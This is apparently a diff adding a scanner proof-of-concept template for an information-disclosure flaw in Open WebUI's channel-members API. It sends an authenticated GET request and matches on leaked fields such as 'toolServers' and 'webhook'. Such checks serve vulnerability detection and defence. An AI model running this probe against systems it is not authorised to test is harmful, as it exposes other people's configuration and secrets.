@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 Open WebUI 频道成员接口是否泄露敏感配置信息。向 /api/v1/channels/{id}/members 发送 GET 请求，检查响应中是否包含 toolServers 或 webhook 等敏感字段。"
+id = "POC-AVE-2026-0821"
+name = "CVE-2026-59222 Open WebUI 频道成员接口敏感信息泄露"
+severity = "medium"
+tags = [
+    "cve-2026-59222",
+    "ave-2026-0821",
+    "information-disclosure",
+]
+vuln_id = [
+    "CVE-2026-59222",
+    "AVE-2026-0821",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/channels/1/members"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "toolServers",
+    "webhook",
+    "settings",
+]
